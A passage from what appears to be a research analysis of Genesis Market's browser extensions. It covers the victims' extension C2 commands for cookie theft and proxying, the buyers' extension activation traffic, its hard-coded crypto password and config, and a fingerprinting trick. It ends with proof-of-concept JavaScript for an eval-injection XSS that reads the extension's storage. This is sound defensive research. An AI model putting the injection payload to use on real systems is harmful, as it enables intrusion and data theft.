</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">span</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;display: none;&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;bitget&#34;</span><span class="p">&gt;</span>Add withdrawal address<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;display: none;&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;bittrex&#34;</span><span class="p">&gt;</span>Please Confirm Your Withdrawal<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;result&#34;</span><span class="p">&gt;</span>Checks still running...<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>This script is embedded on this page, and the result is:</p>
<iframe style="width: 100%; height: 100px;" src="./detect.html#mail.google+outlook.live+yahoo"></iframe>
<h3 id="deputizing-the-victims-browser---request-proxying">Deputizing the victim&rsquo;s browser - request proxying</h3>
<p>Another interesting feature of the malicious browser extension is the ability to proxy HTTP requests through the victim&rsquo;s browser. This feature can be enabled at any time by the C2 server using the aptly-named <code>proxy</code> command (more on the other supported commands later). In addition, the feature can also be enabled during registration with the C2 server if <code>isEnabledProxy</code> is set to <code>true</code> in the JSON-formatted response of the registration endpoint at <code>https://{c2.domain}/api/machine/init</code>.</p>
<p>When enabled, the proxy feature attempts to set up a WebSocket connection channel to another C2 server which is relayed by the main C2 server in the response to <code>https://{c2.domain}/api/machine/settings</code> on port 4343. Once set up, the proxy submodule will wait for commands from its associated C2 server, which can be one of:</p>
<ul>
<li><code>HTTP_REQUEST</code> request a URL through the victim&rsquo;s browsers, adding the victim&rsquo;s own cookies using the <code>fetch()</code> API</li>
<li><code>AUTH</code> provide the <code>uuid</code> of the malicious extension&rsquo;s instance</li>
<li><code>GET_COOKIES</code> get a copy of all the cookies</li>
</ul>
<p>Requests made by the C2 server through the <code>HTTP_REQUEST</code> command occur within the context of the extension, making them invisible to victims. We were able to test this specific subset of the functionality by creating our own set of emulated C2 servers, so we could see the proxy functionality in action asking the extension to make a request to <code>http://localhost:8080/test2</code>:</p>
<p><img src="proxy_c2_http_request.png" alt="HTTP_REQUEST message sent by the emulated C2 server to the browser extension"></p>
<p>As a result, the extension indeed issued a request to <code>http://localhost:8080/test2</code>:</p>
<p><img src="proxy_c2_http_request_initiatior.png" alt="Requests from the extension to localhost:8080/test2"></p>
<p>Despite the existence of this proxy feature, its intended use case remains a mystery to us. From the point of view of features available to market users, the buyers&rsquo; extension - which is further elaborated on later in this writeup - makes no reference to this feature. There is the possibility to set a SOCKS5 proxy in the extension settings page, but that does not seem related to the malicious extension&rsquo;s proxy feature. Additionally, the user manual only mentions the SOCKS5 proxy feature.</p>
<p>It may be the case that proxying through the victim&rsquo;s machine is possible for bot buyers, perhaps through a SOCKS5 interface exposed by the Danabot-like malware that&rsquo;s deployed as part of the infection chain. However, we do not have enough information to make any definitive conclusions on whether these features are available to buyers or not.</p>
<h3 id="other-functionality">Other functionality</h3>
<p>Besides rewriting emails and proxying requests, the C2 server can send the following commands to the victim:</p>
<ul>
<li><code>extension</code> enable or disable a certain browser extension</li>
<li><code>info</code> get information about the victim&rsquo;s machine (e.g. WebGL machine details)</li>
<li><code>push</code> send a push notification</li>
<li><code>cookies</code> get a copy of all cookies</li>
<li><code>screenshot</code> send back a screenshot of the page currently open in the browser</li>
<li><code>url</code> open a URL in the browser</li>
<li><code>current_url</code> send back the URL of the current tab</li>
<li><code>history</code> send back the browser history</li>
<li><code>injects</code>  download a new set of rules from the server, which specify extra JavaScript to execute on certain domains</li>
<li><code>settings</code> get a new settings object from the server; for example links it should grab</li>
</ul>
<h1 id="analysis-of-the-browser-extension-for-buyers">Analysis of the browser (extension) for buyers</h1>
<p>Buyers on the market get access to a Chromium extension (as <code>.crx</code> file) and a browser (based on <a href="https://github.com/ungoogled-software/ungoogled-chromium">ungoogled-chromium</a>) with the extension preinstalled. This extension can easily import bought fingerprints and cookies.</p>
<h2 id="general-functionality">General functionality</h2>
<p>The extension, once activated, allows buyers to automatically import bought fingerprints and cookies. Furthermore, it allows for the setup of an SOCKS5 based proxy. The plugin can been seen in action in the GIF below.</p>
<p><img src="buyer_browser.gif" alt="Browser in action"></p>
<h2 id="analyzing-the-source-code">Analyzing the source code</h2>
<p>This extension is heavily obfuscated, making it difficult to determine exactly how it works and what features it offers. We combined the analysis of the source code with dynamic analysis in an isolated VM.</p>
<p>The extension requires a large list of permissions, for example, allowing it full access to all visited pages. The full list of permissions is:</p>
<pre tabindex="0"><code>&#34;permissions&#34;: [&#34;&lt;all_urls&gt;&#34;, &#34;tabs&#34;, &#34;storage&#34;, &#34;unlimitedStorage&#34;, &#34;cookies&#34;, &#34;webNavigation&#34;, &#34;webRequestBlocking&#34;, &#34;webRequest&#34;, &#34;browsingData&#34;, &#34;privacy&#34;, &#34;background&#34;, &#34;bookmarks&#34;, &#34;downloads&#34;, &#34;clipboardRead&#34;, &#34;clipboardWrite&#34;, &#34;contentSettings&#34;, &#34;contextMenus&#34;, &#34;history&#34;, &#34;idle&#34;, &#34;management&#34;, &#34;pageCapture&#34;, &#34;topSites&#34;, &#34;system.cpu&#34;, &#34;system.memory&#34;, &#34;system.storage&#34;, &#34;declarativeContent&#34;, &#34;activeTab&#34;, &#34;power&#34;, &#34;desktopCapture&#34;, &#34;proxy&#34;],
</code></pre><p>This list contains a number permissions for which it is not clear what functionality they are intended for, such as <code>desktopCapture</code>, <code>system.cpu</code> and <code>power</code>.</p>
<p>When the extension is installed, users need to activate it using an &ldquo;activation code&rdquo;. When a code is entered, the browser sends a POST request to the following URL:</p>
<pre tabindex="0"><code>https://sync.approveconnects[.]com/security
</code></pre><p>If this request fails, it tries again with the following URL:</p>
<pre tabindex="0"><code>https://sync.gsconnects[.]com/security
</code></pre><p>This request contains a multipart body with 3 variables: <code>a</code>, <code>v</code> and <code>i</code>. Each field is encrypted and is included as binary data in the multipart body. The encryption of the activation key (the field <code>a</code>) works as follows:</p>
<ul>
<li>The activation key is encoded as a JSON string (enclosed in double quotes).</li>
<li>This string is URL-encoded (replacing the double quotes with <code>%22</code>, etc.).</li>
<li>This result is then compressed using deflate (the compression algorithm used by zlib, but without a zlib header).</li>
<li>Then, a key and IV are generated. This uses the OpenSSL <code>EVP_BytesToKey</code> KDF with a random 8-character salt and the hard-coded password <code>liauyd(o*!&amp;@#ijKj@!#asdg2134</code>.</li>
<li>The compressed data is encrypted using AES-CBC with the generated key and IV and with PKCS7 padding.</li>
<li>The data submitted in the request is the random salt followed by the cipher text.</li>
</ul>
<p>The parameters <code>v</code> and <code>i</code> are encrypted in a similar way, but with a different password. The password is generated by taking the activation key, swapping the case of all letters (replacing lowercase characters with uppercase characters and vice versa) and appending the string <code>asdg2134</code>.</p>
<p>The parameter <code>v</code> contains the version number of the plugin (currently 7.2), as a JSON dictionary:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;v&#34;</span><span class="p">:</span> <span class="s2">&#34;7.2&#34;</span><span class="p">}</span>
</span></span></code></pre></div><p>The parameter <code>i</code> contains certain fingerprinting data of the browser and extension, such as the user agent, OS details and a list of the removable drives on the user&rsquo;s machine. We don&rsquo;t see any way this could be relevant for the extension, so this is likely just included to monitor and track the buyers:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;p&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;p&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;a&#34;</span><span class="p">:</span> <span class="s2">&#34;aarch64&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;b&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;c&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;d&#34;</span><span class="p">:</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;m&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;a&#34;</span><span class="p">:</span> <span class="mi">4113801216</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;s&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;a&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;c&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;a&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;536870912|777db833-9d2e-40e5-a1cb-75b26827b847|/boot/efi|/boot/efi&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;1048576|7ff0d82f-ee43-4c1d-85a4-a5af0aa1aab5|/media/user/6c781ebb-c8e1-430b-84ae-1bc1ff6891ee|/media/user/6c781ebb-c8e1-430b-84ae-1bc1ff6891ee&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;32797360128|0f25215a-4b5c-4569-ab5a-552bc703bd94|/|/&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;b&#34;</span><span class="p">:</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;i&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;a&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;c&#34;</span><span class="p">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;a&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;536870912|777db833-9d2e-40e5-a1cb-75b26827b847|/boot/efi|/boot/efi&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;1048576|7ff0d82f-ee43-4c1d-85a4-a5af0aa1aab5|/media/user/6c781ebb-c8e1-430b-84ae-1bc1ff6891ee|/media/user/6c781ebb-c8e1-430b-84ae-1bc1ff6891ee&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s2">&#34;32797360128|0f25215a-4b5c-4569-ab5a-552bc703bd94|/|/&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;b&#34;</span><span class="p">:</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;j&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;c&#34;</span><span class="p">:</span> <span class="s2">&#34;9a3bd3e8cebf17110f689f58a4a1f43e&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;w&#34;</span><span class="p">:</span> <span class="s2">&#34;6c14da109e294d1e8155be8aa4b1ce8e&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;s&#34;</span><span class="p">:</span> <span class="s2">&#34;Chrome 111&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;p&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;ua&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;browser&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;Chrome&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="s2">&#34;111.0.0.0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;major&#34;</span><span class="p">:</span> <span class="s2">&#34;111&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;engine&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="s2">&#34;537.36&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;WebKit&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;os&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;Linux&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="s2">&#34;aarch64&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;device&#34;</span><span class="p">:</span> <span class="p">{},</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;cpu&#34;</span><span class="p">:</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;a&#34;</span><span class="p">:</span> <span class="s2">&#34;ad449aba7595468941c6d3b6aad54a4fc76797aa&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;t&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;s&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;b&#34;</span><span class="p">:</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The server can reverse this process by first decrypting the activation code, generating the same key and IV using the salt. Then the activation code can be used to decrypt the <code>v</code> and <code>i</code> fields.</p>
<p>Jumping through all these hoops does gives us an &lsquo;activated&rsquo; extension:</p>
<p><img src="activation.png" alt="Activated extension"></p>
<p>At regular intervals, the extension will submit its activation code again (specified by <code>renew_interval</code>/<code>renew_enabled</code>). This request contains the same variables as the first activation request with 3 additional fields: <code>b</code>, <code>e</code> and <code>d</code>. The exact meaning of these fields has not yet been determined.</p>
<p>While the code is obfuscated, the settings reveal some of its functionality. We managed to obtain the following configuration object from the extension:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;pl_version&#34;</span><span class="p">:</span> <span class="s2">&#34;7.2&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;sel_pl_version&#34;</span><span class="p">:</span> <span class="s2">&#34;7.2&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;options_version&#34;</span><span class="p">:</span> <span class="s2">&#34;7.2&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;available_versions&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;7.2&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;storage_key&#34;</span><span class="p">:</span> <span class="s2">&#34;ext_set&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;enabled&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;useragent&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;renew_enabled&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;renew_interval&#34;</span><span class="p">:</span> <span class="mi">3600000</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;renew_onstartup&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;sync&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;proxy_enabled&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;proxy&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;ip&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;port&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;settings&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;bf&#34;</span><span class="p">:</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;exceptions_list&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;chrome://*&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;links_domain_sync&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sync.approveconnects.com&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sync.gsconnects.com&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;link_path_sync&#34;</span><span class="p">:</span> <span class="s2">&#34;/security/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;link_path_bots&#34;</span><span class="p">:</span> <span class="s2">&#34;/client/bots&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;link_path_profile&#34;</span><span class="p">:</span> <span class="s2">&#34;/client/account/profile&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;links_domain_shop&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;genesis.market&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;g3n3sis.pro&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;g3n3sis.org&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;keep_domains&#34;</span><span class="p">:</span> <span class="s2">&#34;genesis.market\\ng3n3sis.pro\\ng3n3sis.org&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;links_bugreport&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;selected_fp&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;bot_id&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;hash_unique&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;act_key&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;plugin_id&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;clean_settings&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;items&#34;</span><span class="p">:</span> <span class="p">{},</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;since&#34;</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The URL for the activation is constructed by taking a value from the <code>links_domain_sync</code> and appending the <code>link_path_sync</code> path.</p>
<p>Note that this extension had just been installed and not activated, so the values when in use will be different. It looks likely that the <code>link_path_bots</code> endpoint is used to automatically retrieve the list of cookies and online fingerprints that the buyer has bought. The <code>proxy</code> and <code>selected_fp</code> fields would be filled with settings if the extension was in use.</p>
<p>The configuration can also be obtained from disk from files at the following path:</p>
<pre tabindex="0"><code>&lt;Chrome Settings Dir&gt;/Default/Local Extension Settings/&lt;Extension ID&gt;/*.log
</code></pre><p>This is a LevelDB database, which appears to also keep a number of older versions of the configuration.</p>
<p>The extension contains functionality (and has the permission) to configure a SOCKS5 proxy. In the victim&rsquo;s extension, a method for proxying HTTPS requests through the victim&rsquo;s browser was found that uses WebSockets. The functionality to send requests over such a WebSocket connection was not found in the buyer&rsquo;s extension, although due to the obfuscation this is not fully certain. It is still an open question on whether proxying through the victim&rsquo;s machine directly was a feature offered by the market, or whether the buyers only used their own SOCKS5 proxies.</p>
<h2 id="fingerprinting-buyers">Fingerprinting buyers</h2>
<p>The extension registers an event handler on all webpages. The content script that gets added to each visited webpage by the extension registers an event handler for a custom event named <code>hammilton</code>. This appears to be a method for communicating with the extension from a webpage, as it will pass the result back to the page. When this event is received by the content script, it sends a message to the background script, which will send a response back as JavaScript code which is evaluated in the content script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s1">&#39;javascript: if(window.bunny &amp;&amp; window.bunny.cb &amp;&amp; window.bunny.cb[0])window.bunny.cb[0]([{&#34;result&#34;:{&#34;result&#34;:0}}])&#39;</span>
</span></span></code></pre></div><p>Therefore, by setting <code>window.bunny.cb[0]</code> to a JavaScript function and sending the event, it is possible to determine if a user has this extension installed by determining if that function is called.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">bunny</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&#34;cb&#34;</span><span class="o">:</span> <span class="p">[</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Extension detected.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}]}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">dispatchEvent</span><span class="p">(</span><span class="k">new</span> <span class="nx">CustomEvent</span><span class="p">(</span><span class="s2">&#34;hammilton&#34;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;detail&#34;</span><span class="o">:</span> <span class="p">{</span><span class="s2">&#34;l&#34;</span><span class="o">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span> <span class="s2">&#34;o&#34;</span><span class="o">:</span> <span class="s2">&#34;b&#34;</span><span class="p">}}));</span>
</span></span></code></pre></div><p>The reason why this is present is not entirely clear to us. However, it does provide us with a nice way of fingerprinting the buyers&rsquo; extension.</p>
<h2 id="taking-it-one-step-further">Taking it one step further&hellip;</h2>
<p>Fingerprinting buyers is already cool of course, but maybe we can take it one step further? For example by exploiting a XSS vulnerability in the extension itself? There is a vulnerability in the method used to communicate back to the webpage. The parameter <code>l</code> in the custom event <code>detail</code> object is used in the response code that is evaluated. This value is used as-is and not escaped before calling <code>eval</code>. By including a single quote character (<code>'</code>), it possible to inject additional JavaScript code that gets executed in the context of the content script.</p>
<p>For example, the following event, sent from the webpage:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">dispatchEvent</span><span class="p">(</span><span class="k">new</span> <span class="nx">CustomEvent</span><span class="p">(</span><span class="s2">&#34;hammilton&#34;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;detail&#34;</span><span class="o">:</span> <span class="p">{</span><span class="s2">&#34;l&#34;</span><span class="o">:</span> <span class="s2">&#34;a&#39;; console.log(1); //&#34;</span><span class="p">,</span> <span class="s2">&#34;o&#34;</span><span class="o">:</span> <span class="s2">&#34;b&#34;</span><span class="p">}}));</span>
</span></span></code></pre></div><p>Results in the following code being evaluated inside the content script (newlines added for legibility):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s1">&#39;javascript: if(window.bunny &amp;&amp; window.bunny.cb &amp;&amp; window.bunny.cb[a&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//])window.bunny.cb[a&#39;; console.log(1); //]([{&#34;result&#34;:{&#34;result&#34;:0}}])&#39;
</span></span></span></code></pre></div><p>Therefore, the <code>console.log(1)</code> is executed by the content script, instead of the page.</p>
<p>Browser extensions use an (invisible) background page which can use all the permissions granted to that extension. This background page does not directly have access to the contents of the visited webpages, but it can inject new JavaScript to run on those pages, called &ldquo;content scripts&rdquo;. Content scripts have access to a specific page and can interact with that page&rsquo;s DOM, but use a JavaScript environment that is separate from the page&rsquo;s own JavaScript environment. Content scripts do not have all the permissions of the background page, but they do have permission to send messages to the background page and can access the storage of the extension, making them more powerful than the page&rsquo;s own JavaScript.</p>
<p>Therefore, one of the things that can be done with by sending messages to the background page is copying the configuration of the plugin. For example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;storage&#34;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;log&#34;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">+=</span> <span class="s2">&#34;Storage obtained: &#34;</span> <span class="o">+</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">detail</span><span class="p">.</span><span class="nx">storage</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;\n&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="sb">`chrome.storage.local.get(null, (storage) =&gt; { window.dispatchEvent(new CustomEvent(&#34;storage&#34;, {&#34;detail&#34;: {&#34;storage&#34;: storage }})); });`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
